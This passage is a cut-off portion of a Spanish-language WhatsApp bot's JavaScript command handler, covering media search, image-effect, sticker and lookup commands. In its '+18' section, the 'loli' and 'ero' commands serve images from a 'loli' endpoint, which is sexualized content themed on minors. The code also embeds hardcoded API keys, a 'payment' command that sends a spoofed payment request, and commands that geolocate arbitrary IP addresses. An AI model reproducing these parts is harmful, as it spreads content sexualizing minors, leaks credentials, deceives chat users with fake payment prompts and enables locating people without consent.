      let listmenuu = [`VIDEO: ${search.all[0].title}`,`MUSIC: ${search.all[1].title}`,`VIDEO: ${search.all[2].title}`,`MUSIC: ${search.all[3].title}`,`VIDEO: ${search.all[4].title}`,`MUSIC: ${search.all[5].title}`,`VIDEO: ${search.all[6].title}`,`MUSIC: ${search.all[7].title}`,`VIDEO: ${search.all[8].title}`,`MUSIC: ${search.all[9].title}`,`VIDEO: ${search.all[10].title}`,`MUSIC: ${search.all[11].title}`,`VIDEO: ${search.all[12].title}`,`MUSIC: ${search.all[13].title}`,`VIDEO: ${search.all[14].title}`,`MUSIC: ${search.all[15].title}`,`VIDEO: ${search.all[16].title}`,`MUSIC: ${search.all[17].title}`,`VIDEO: ${search.all[18].title}`,`MUSIC: ${search.all[19].title}`]
      let listmenuuu = [`\n${search.all[0].description}`,`\n${search.all[1].description}`,`\n${search.all[2].description}`,`\n${search.all[3].description}`,`\n${search.all[4].description}`,`\n${search.all[5].description}`,`\n${search.all[6].description}`,`\n${search.all[7].description}`,`\n${search.all[8].description}`,`\n${search.all[9].description}`,`\n${search.all[10].description}`,`\n${search.all[11].description}`,`\n${search.all[12].description}`,`\n${search.all[13].description}`,`\n${search.all[14].description}`,`\n${search.all[15].description}`,`\n${search.all[16].description}`,`\n${search.all[17].description}`,`\n${search.all[18].description}`,`\n${search.all[19].description}`]
      let numero = 1
      let startnum = 0
      let startnumm = 0
      for (let x of listmenu) {
      const list = {title: 'NÚMERO DE RESULTADO ' + numero++,
      rows: [
         {
          title: `${listmenuu[startnum++]}`,
          description: `${listmenuuu[startnumm++]}`,
          rowId: `${prefix}${x}`
}, 
]
}
sections.push(list)   
}
const sendm =  simple.sendMessage(
m.chat, 
{
text: "\n\n*_DATOS BUSCADOS_*",
footer: botname,
title: `AQUÍ ESTÁ SU RESULTADO DE *${text}* _seleccione la canción o el video a continuación_`,
buttonText: "YT MUSIC",
sections
}, { quoted : m })
}
break
case 'ytsaudio': case 'ytsmusic': case 'ytsearchmusic': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                   sticWait(from)
                  if (!text) throw `Ejemplo : ${prefix + command} Whisky and Spice`
                  let yts = require("yt-search")
                  let search = await yts(text)                
                  let no = 1
                  let sections = []   
                  for (let i of search.all) {
                  const list = {title: `${i.title}`,
                  rows: [
                      {
                      title: `${i.title}\n`, 
                      rowId: `${prefix}ytmp3 ${i.url}`,
                      description: `${i.description}\n*SUBIDO HACE:* ${i.ago}\n*CANAL:* ${i.author.name}\n*VIEWS:* ${i.views}\n*DURACIÓN:* ${i.timestamp}\n*LINK:* ${i.url}`
                      }, 
                      ]
                        }
                        sections.push(list)   
                        }
                        const sendm =  simple.sendMessage(
                        m.chat, 
                        {
                        text: ` ${text}`,
                        footer: botname,
                        title: `Hola ${pushname} Aquí están los resultados de búsqueda de ytsaudio`,
                        buttonText: "LISTA DE AUDIOS",
                        sections
                        }, { quoted : m })
                        }
                    break
  case 'ytsvideo': case 'ytsearchvideo': {
               if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                  sticWait(from)
                  if (!text) throw `Ejemplo : ${prefix + command} La MVP`
                  let yts = require("yt-search")
                  let search = await yts(text)                
                  let no = 1
                  let sections = []   
                  for (let i of search.all) {
                  const list = {title: `${i.title}`,
                  rows: [
                      {
                      title: `${i.title}\n`, 
                      rowId: `${prefix}ytmp4 ${i.url}`,
                      description: `${i.description}\n*SUBIDO HACE:* ${i.ago}\n*CANAL:* ${i.author.name}\n*VIEWS:* ${i.views}\n*DURACIÓN* ${i.timestamp}\n*LINK:* ${i.url}`
                      }, 
                      ]
                        }
                        sections.push(list)   
                        }
                        const sendm =  simple.sendMessage(
                        m.chat, 
                        {
                        text: ` ${text}`,
                        footer: botname,
                        title: `Hola ${pushname} *Aquí están los resultados de búsqueda de ytsvideo*`,
                        buttonText: "LISTA DE VÍDEOS",
                        sections
                        }, { quoted : m })
                        }
                    break
            case 'playstore': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Ejemplo : ${prefix + command} Apex Legends`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `⭔ Playstore Buscqueda de : ${text}\n\n`
            for (let i of res.result) {
            teks += `⭔ Nombre : ${i.name}\n`
            teks += `⭔ Link : ${i.link}\n`
            teks += `⭔ Developer : ${i.developer}\n`
            teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'cellinfo': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Ejemplo : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${judul}
⭔ Realease: ${rilis}
⭔ Tamaño: ${ukuran}
⭔ Tipo: ${type}
⭔ Almacenamiento: ${storage}
⭔ Monitor: ${display}
⭔ Pulgadas: ${inchi}
⭔ Píxel: ${pixel}
⭔ Píxel de vídeo: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Batería: ${batrai}
⭔ Marca de batería: ${merek_batre}
⭔ Detalle: ${detail}`
            simple.sendImage(m.chat, thumb, capt, m)
            }
            break
	                case 'SsWeb': case 'ssweb': case 'Ssweb': case 'ScreenshotWeb': case 'screenshotweb':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                 if (!text) throw `Ejemplo: *${prefix + command} https://github.com/CarlosTwT*`
                 sticWait(from)
                 simple.sendMessage(m.chat, {image: {url: `https://api.popcat.xyz/screenshot?url=${text}`}})
            }
            break
            case 'npmsearch':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
    let fetch = require('node-fetch') 
	if (!text) throw `_Ingresa el nombre del paquete npm_\n_Ejemplo_ : ${prefix}npmsearch whatsapp-web.js`
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
        case 'spotify':
        if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
            if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
            axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=85faf717d0545d14074659ad&url=${args[0]}`).then(({ data }) => {
                var caption = `Titulo : ${data.result.title}\n`
                caption += `Artista : ${data.result.artists}\n`
                caption += `Duracion : ${data.result.duration}\n`
                caption += `Popularidad : ${data.result.popularity}\n`
                caption += `Preview : ${data.result.preview_url}\n`
                simple.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
                    simple.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
                })
            })
            break
            case 'pinterest': {
                sticWait(from)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                simple.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
            }
            break
	    case 'imgpareja': {	 
	             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                sticWait(from)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                simple.sendMessage(m.chat, { image: { url: random.male }, caption: `pareja hombre` }, { quoted: m })
                simple.sendMessage(m.chat, { image: { url: random.female }, caption: `pareja mujer` }, { quoted: m })
            }
	    break
            case 'coffe': case 'cafe': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Siguiente Imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Café random`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Ingrese el título de la consulta'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Siguiente'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Título : ${result.title}\n⭔ Categoría : ${result.type}\n⭔ Detalles : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Ingrese el título de la consulta'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Siguiente imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Título : ${result.title}\n⭔ Fuente : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
        case 'ringtone': {
		if (!text) throw `Ejm : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		simple.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 ANIME & +18 - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
          case 'loli': case 'Loli': {        
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                sticWait(from)
            let buttons = [
                    {buttonId: `loli`, buttonText: {displayText: 'Next Imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://leyscoders-api.herokuapp.com/api/loli?apikey=MIMINGANZ' },
                    caption: ` Random Loli xd`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'pack':{         
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            sticWait(from)
            let anu = await fetchJson('https://raw.githubusercontent.com/darlyn1234/recursos/main/proyectosweb/hotgirl-darlyn.json')
            let random = anu[Math.floor(Math.random() * anu.length)]
            simple.sendMessage(m.chat, { image: { url: random.hot }, caption: `aqui ta` }, { quoted: m })
        }
        break
          case 'ero': case 'eronsfw': {         
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                sticWait(from)
            let buttons = [
                    {buttonId: `ero`, buttonText: {displayText: 'Next Imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://leyscoders-api.herokuapp.com/api/loli?apikey=MIMINGANZ' },
                    caption: ` deje de pedirme esto 😳`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
				case 'waifu2': case 'loli2':	
	             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit		            		
					sticWait(from)
					axios.get(`https://api.waifu.pics/sfw/waifu`)
					.then(({data}) => {
					simple.sendImage(m.chat, data.url, mess.success, m)
					})
					break
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':             
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
		 			sticWait(from)
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
						simple.sendImageAsSticker(m.chat, data.url, st, { packname: global.packname, author: global.author })
					})
					break
case 'nekost':          
					sticWait(from)
					axios.get(`https://api.waifu.pics/sfw/neko`)
					.then(({data}) => {
						simple.sendImageAsSticker(m.chat, data.url, st, { packname: global.packname, author: global.author })
					})
					break
case 'neko': case 'waifu':case 'trap':case 'blowjob':     
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit     
					sticWait(from)
					axios.get(`https://api.waifu.pics/nsfw/${command}`)
					.then(({data}) => {
						simple.sendImageAsSticker(m.chat, data.url, st, { packname: global.packname, author: global.author })
					})
					break
					            case 'milf': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                sticWait(from)
            let buttons = [
                    {buttonId: `milf`, buttonText: {displayText: 'Next Imagen'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://api.zacros.my.id/randomimg/milf' },
                    caption: ` Imagen random de milf`,
                    footer: simple.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                simple.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'doge':
case 'dogestick':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await simple.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'animestick':{
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await simple.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 LOGOS - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
    case "hornycard": {
        try {
            user = m.message.extendedTextMessage.contextInfo.participant || mentioned[0] || undefined
        } catch {
           let user = m.sender
        }
        try {
            ppuser = await simple.profilePictureUrl(user, 'image')
        } catch {
            ppuser = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMxMUXFtd5GrFkxyrU-f5zA2IH8MZ-U-cFKg&usqp=CAU'
        }
        const response = await axios.get(ppuser, {
            responseType: 'arraybuffer'
        })
        const buffer = Buffer.from(response.data, "utf-8")
        let image = await bufferToUrl(buffer)
        let url = `https://some-random-api.ml/canvas/horny?avatar=${image.link}`
        try {
            await simple.sendMessage(from, {
                image: {
                    url: url
                },
                caption: "Tu tarjeta cachonda aquí."
            }, {
                quoted: m
            });
        } catch (e) {
            await simple.sendMessage(from, {
                text: `pasa algo malo\n${e.message}`
            }, {
                quoted: m
            });
        }
    }
    break
                        case '3d-effect': case '1917-style': case '3d-rubystone': case '3d-text-sub-zombie': case '3dengraved': case '3dluxury': case '3dlove': case '3dgolden': case '3dgradient': case '3dneonlight': case '3dpapercut': case '3drainbow': case '3drealistic': case '3dscifi': case '3dtext-effect': case '3dunderwater': case '3dwaterpipe': case 'alice-league-of-kings': case 'angel-wing-galaxy': case 'anubis': case 'arch-crossfire': case 'art-shader': case 'assassins-creed': case 'azzenka-league-of-kings':  case 'birthday-cards': case 'birthday-greeting': case 'birthday-roses': case 'black-metal': case 'blood-frosted': case 'blood-text': case 'blue-effect': case 'blue-glitter': case 'brickwall': case 'brokentext': case 'bubble-effect': case 'bulb-effect':  case 'circuit': case 'dark-gold-metal': case 'color-fireworks': case 'cool-metal': case 'decorated-cookie': case 'deluxe-gold': case 'dinamo': case 'deluxe-silver': case 'double-exposure': case 'dragon-fire': case 'eroded-metal': case 'firework':  case 'fox-crossfire': case 'fun-certify1': case 'fun-certify2': case 'futuristic': case 'galaxy-effect2': case 'galaxy-effect': case 'galaxy-angel': case 'galaxy-text': case 'galaxy-text-3': case 'gankk-league-of-kings': case 'genji-overwatch': case 'glossy': case 'glossy-bluemetal': case 'glossy-carbon': case 'glossy-chrome': case 'gold-avenger': case 'gold-barcar': case 'gold-batman': case 'gold-fox': case 'gold-bird2': case 'gold-eagle': case 'gold-effect': case 'gold-glitter': case 'gold-lion': case 'gold-lion2': case 'gold-star': case 'gold-tiger': case 'golden-letter': case 'gr-crossfire': case 'graffiti-color': case 'graffiti-text3': case 'graffiti-text5': case 'graffiti-text8': case 'graffiti-text4': case 'heart-birthday': case 'hanzo-overwatch': case 'greenhorror': case 'halloween-fire': case 'green-brush': case 'hero3-crossfire': case 'heart-cups': case 'holographic': case 'light-text':  case 'lend-text': case 'ledtext': case 'layeredtext': case 'lol-caitlyn': case 'lol-ahri': case 'logo-galaxy': case 'lol-fizz': case 'lol-ezreal-and-shen': case 'lol-fiora': case 'lol-draven': case 'lol-jinx': case 'lol-kalista': case 'lol-khazix': case 'lol-kogmaw': case 'lol-leesin': case 'lol-lux': case 'lol-master-yi': case 'lol-miss-fortune': case 'lol-nidalee': case 'lol-quinn': case 'lol-sona': case 'lol-riven': case 'lol-talon': case 'lol-thresh': case 'lol-vayne': case 'machines-effect': case 'lol-yasuo': case 'lol-zed': case 'lol-wukong': case 'magic-text': case 'mei-overwatch': case 'matrix-text': case 'magmatext': case 'metal-lion-2': case 'metal-headshot': case 'metal-avenger': case 'metal-real-madrid': case 'metal-star': case 'metal-superman': case 'metal-text-effect': case 'metallic-letter': case 'metalic': case 'metal-wolf-2': case 'mganga-league-of-kings': case 'miniontext': case 'modern-gold-3': case 'modern-gold-4': case 'modern-gold-5-pro': case 'modern-gold-green': case 'modern-gold-purple': case 'modern-gold-red': case 'modern-gold-sliver': case 'modern-goldred': case 'neon': case 'neon-2': case 'neon-brightblue': case 'neon-effects': case 'neon-light-galaxy': case 'neon-satin': case 'neondevil': case 'neonlight': case 'neontext-light': case 'paper-cut': case 'paperart': case 'rainbow-effect': case 'reaper-overwatch': case 'red-birthdaycake': case 'redhot-metal': case 'resht-league-of-kings': case 'science': case 'sfg-crossfire': case 'sketch': case 'wetglass': case 'watercolor': case 'water-effect': case 'water-3d': case 'violet-league-of-kings': case 'snowtext': case 'soldier-overwatch': case 'sunlight-shadow': case 'transformer': {             
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'uso?\n el comando + texto'
                sticWait(from)
                 simple.sendMessage(m.chat, {image: {url: `https://api.violetics.pw/api/textpro/${command}?apikey=beta&text=${text}`}})
	    }
            break
            case 'glitch':
case 'tiktokefect':
case 'ttlogo':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} text1|text2`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/textpro/glitchtext?apikey=beta&text=${teks1}&text2=${teks2}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'leonlogo':
case 'logoleon':
case 'leonlg':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} text1|text2`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/textpro/lion-mascot?apikey=0567-17a1-1747&text=${teks1}&text2=${teks2}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'lisatxt':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} text1|text2`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
	buffer = await getBuffer(`http://brizas-api.herokuapp.com/imgeffect/lisapresentation?apikey=brizaloka&text=${teks1}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'sings':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} text1|text2`)
text1 = text.split('|')[0] ? text.split('|')[0] : '-'
text2 = text.split('|')[1] ? text.split('|')[1] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/photofunia/arrow-signs?apikey=0567-17a1-1747&text1=${text1}&text2=${text2}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'breakingnew':
case 'breakingnews':
case 'bnews':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} titulo principal|canal|subtítulo`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
teks3 = text.split('|')[2] ? text.split('|')[2] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/photofunia/breaking-news?apikey=0567-17a1-1747&title1=${teks1}&channel=${teks2}&title2=${teks3}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'retrowb':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} txt1|txt2|txt3`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
teks3 = text.split('|')[2] ? text.split('|')[2] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/photofunia/retro-wave?apikey=beta&text1=${teks1}&text2=${teks2}&text3=${teks3}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'diploma':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} titulo Universidad|años|nombre|grado|presidente|vicepresidente`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
teks3 = text.split('|')[2] ? text.split('|')[2] : '-'
teks4 = text.split('|')[3] ? text.split('|')[3] : '-'
teks5 = text.split('|')[4] ? text.split('|')[4] : '-'
teks6 = text.split('|')[5] ? text.split('|')[5] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/photofunia/diploma?apikey=beta&UniversityName=${teks1}&year=${teks2}&Name=${teks3}&Degree=${teks4}&President=${teks5}&VicePresident=${teks6}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
case 'esfrase':{

if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //ae
db.data.users[m.sender].limit -= 1 // -1 limit
sticWait(from)
if (!text) return reply(`usa ${prefix + command} texto1|texto2|texto3|texto4|texto5`)
teks1 = text.split('|')[0] ? text.split('|')[0] : '-'
teks2 = text.split('|')[1] ? text.split('|')[1] : '-'
teks3 = text.split('|')[2] ? text.split('|')[2] : '-'
teks4 = text.split('|')[3] ? text.split('|')[3] : '-'
teks5 = text.split('|')[4] ? text.split('|')[4] : '-'
	buffer = await getBuffer(`https://api.violetics.pw/api/photofunia/keep_calm?apikey=beta&line1=${teks1}&line2=${teks2}&line3=${teks3}&line4=${teks4}&line5=${teks5}`)
	simple.sendImage(m.chat, buffer, mess.succes, m)
	}
	break
            case 'anonymous-neon': {
             
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'y el texto?'
                sticWait(from)
                 simple.sendMessage(m.chat, {image: {url: `https://api.violetics.pw/api/ephoto360/${command}?apikey=beta&text=${text}`}, caption: `By SimpleBot`}, {quoted: m})
	    }
            break
                        case 'trump': {
             
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'y el texto?'
                sticWait(from)
                simple.sendMessage(m.chat, { image: { url: `https://zenzapis.xyz/creator/trump?text=${text}&apikey=hdiiofficial`}, caption: `By ${command}` }, { quoted: m})
	    }
            break
            case 'einstein': {
             
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'y el texto?'
                sticWait(from)
                simple.sendMessage(m.chat, { image: { url: `https://api.violetics.pw/api/photofunia/${command}?apikey=beta&text=${text}`}, caption: `By SimpleBot`}, {quoted: m})
	    }
            break	

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Búsquedas ™ ❞|═══════════════════════════════════════════⬡|//	

case 'payment' :{
simple.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      amount1000: 1893939,
      requestFrom: m.sender,
      noteMessage: {
        extendedTextMessage: {
          text: "Hola",
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true
            }
          }
        }
      }
    }
  }, {})
}
break

            case 'myip': {
                if (!isCreator) throw mess.owner
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        m.reply("🔎 Mi dirección IP pública es: " + ip);
                    })
                })
            }
            break
case 'ipinfo': case 'infoip': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return reply("donde está la ip? ")
fetchJson('http://ip-api.com/json/' + text ).then((y) => {
reply(`						『 IP INFORMACIÓN 』\n
🖥 *IP:* ${text}
📌 *Estado:* ${y.status}
🌐 *País:* ${y.countryCode}
🌍 *Region:* ${y.region}
🗾 *Nombre de Región:* ${y.regionName}
🏢 *Ciudad:* ${y.city}
🛶 *Zip:* ${y.zip}
🛰 *Latitud:* ${y.lat}
🛩 *Longitud:* ${y.lon}
⏰ *Zona horaria:* ${y.timezone}
🔋 *Isp:* ${y.isp}
📡 *Org:* ${y.org}
🪄 *As:* ${y.as}
`)
})
}
break
case 'iploc': case 'ipmap': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return reply("y la ip?")
reply(`	      『 IP LOCALIZACIÓN 』\n\n*UBICACIÓN DE : ${text}*`)
fetchJson('http://ip-api.com/json/' + text ).then((y) => {
anu = `
🛰 *Latitud:* ${y.lat}
🛩 *Longitud:* ${y.lon}
`
simple.sendMessage(from, { location :  { degreesLatitude: y.lat, degreesLongitude: y.lon }}, {quoted: m})
})
}
break
 case 'checknumber':
  sticWait(from)
  const dripska = {
    method: 'GET',
    url: 'https://phonenumbervalidatefree.p.rapidapi.com/ts_PhoneNumberValidateTest.jsp',
    qs: {number: `${text}`},
    headers: {
      'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
      'X-RapidAPI-Host': 'phonenumbervalidatefree.p.rapidapi.com',
      useQueryString: true
    }
  };
  let dhidhi = require('request')
  dhidhi(dripska, function (error, response, body) {
    if (error) throw new Error(error);
    reply(body);
    console.log(body);
  });
break
case 'veriphone':
  sticWait(from)
  const dripdrop = {
    method: 'GET',
    url: 'https://veriphone.p.rapidapi.com/verify',
    qs: {phone: `${text}`},
    headers: {
      'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
      'X-RapidAPI-Host': 'veriphone.p.rapidapi.com',
      useQueryString: true
    }
  };
  let mhati = require('request')
  mhati(dripdrop, function (error, response, body) {
    if (error) throw new Error(error);
    reply(body);
    console.log(body);
  });
  break
  case 'weather':
  if (!args[0]) throw " proporcione el nombre del lugar o la ubicación"
  try {
    const response = axios.get(
